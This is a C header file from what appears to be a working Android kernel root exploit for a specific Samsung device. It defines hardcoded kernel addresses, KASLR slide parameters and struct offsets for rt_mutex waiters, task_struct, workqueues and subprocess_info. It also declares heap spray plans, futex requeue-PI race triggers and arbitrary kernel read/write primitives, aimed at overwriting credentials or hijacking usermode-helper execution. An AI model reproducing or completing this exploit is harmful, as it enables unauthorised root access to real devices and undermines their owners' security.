#ifndef MINIMAL_RMG_COMMON_H
#define MINIMAL_RMG_COMMON_H

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>

/* ── Kernel memory layout ── */
#ifndef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE    0xffffffc010080000ULL
#endif
#define KIMAGE_VADDR        0xffffffc000000000ULL
#define DIRECT_MAP_BASE     0xffffffc000000000ULL
#define DIRECT_MAP_END      0xffffffc100000000ULL
#define VMEMMAP_START       0xfffffffe00000000ULL
#define PHYS_OFFSET         0x80000000ULL
#define PAGE_SIZE           4096

/* ── Target waiter layout (SM-X216B Android 5.4 kernel) ──
 * task/lock/prio are corroborated by target disassembly and runtime probes;
 * target PI-walk stores and compares the deadline at +0x48.
 */
#define W_TREE_ENTRY        0x00
#define W_PI_TREE_ENTRY     0x18
#define W_TASK              0x30
#define W_LOCK              0x38
#define W_PRIO              0x40
#define W_DEADLINE          0x48
#define W_SIZE              0x50

/* ── task_struct offsets ── */
#define TS_PI_LOCK          0x8dc
#define TS_PI_WAITERS       0x8e8
#define TS_PI_BLOCKED_ON    0x900

/* ── KASLR slide ── */
#define SLIDE_ROWS          32
#define SLIDE_STEP          0x10000ULL

/* ── struct page (5.4) ── */
#define STRUCT_PAGE_SIZE            0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_PAGE_SLAB_CACHE_OFF    0x18
#define STRUCT_PAGE_TYPE_OFF          0x34

/* ── Pipe ── */
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_BUFFER_SLOTS       16

/* ── Workqueue ── */
#define WQ_DFL_PWQ_OFF      0xA0
#define PWQ_POOL_OFF        0x00
#define POOL_WORKLIST_OFF   0x20
#define POOL_NR_IDLE_OFF    0x34

/* ── work_struct ── */
#define WORK_DATA_OFF       0x00
#define WORK_ENTRY_NEXT_OFF 0x08
#define WORK_ENTRY_PREV_OFF 0x10
#define WORK_FUNC_OFF       0x18

/* ── subprocess_info ── */
#define SPI_WORK_OFF        0x00
#define SPI_COMPLETE_OFF    0x30
#define SPI_PATH_OFF        0x38
#define SPI_ARGV_OFF        0x40
#define SPI_ENVP_OFF        0x48
#define SPI_WAIT_OFF        0x58
#define SPI_RETVAL_OFF      0x5C

/* ── CFI jump table ── */
#define OFF_CFI_UMH_EXEC_WORK           0x01601870ULL
#define OFF_CFI_CONFIGFS_READ_FILE      0x015f3a60ULL
#define OFF_CFI_CONFIGFS_WRITE_BIN      0x015f595cULL

/* ── Target addresses ── */
#ifndef ADDR_INIT_TASK
#define ADDR_INIT_TASK      0xffffffc0129e0280ULL
#endif
#define ADDR_INIT_CRED      0xffffffc0129ec740ULL
#define ADDR_DEAD_BEEF      0xDEADBEEFCAFEBABEULL

/* ── Helpers ── */
static inline uint64_t kaddr(uint64_t off) {
    return KIMAGE_TEXT_BASE + off;
}

/* ── Futex opcodes ── */
#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI   10
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI    12
#endif
#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI           6
#endif

/* ── sched_attr ── */
/* Stripped duplicate definition for NDK r30 compatibility
struct sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};
*/

#ifndef PRIO_PROCESS
#define PRIO_PROCESS 0
#endif

/* ── spray_plan (defined BEFORE prototypes) ── */
struct spray_plan {
    uint64_t pi_tree_pc;
    uint64_t pi_tree_right;
    uint64_t pi_tree_left;
    uint64_t task;
    uint64_t lock;
    uint32_t prio;
};

/* ── Function prototypes ── */
int      trigger_futex_race(void);
int      trigger_walk(void);
int      spray_waiter(struct spray_plan *plan);
uint64_t spray_warmup_marker(void);

/* ── Stack measurement helpers ── */
#ifdef ENABLE_STACK_MEASUREMENT
#define LOG_WAITER_SP() \
    do { \
        unsigned long waiter_sp; \
        asm volatile( \
            "sub %0, x29, #0xc8" \
            : "=r" (waiter_sp) \
        ); \
        printf("[WAITER_SP] 0x%lx\n", waiter_sp); \
        fflush(stdout); \
    } while (0)
#else
#define LOG_WAITER_SP()
#endif

/* ── Arbitrary kernel R/W (stubbed) ── */
extern int kwrite64(uint64_t addr, uint64_t val);
extern int kread64(uint64_t addr, uint64_t *out);

#endif
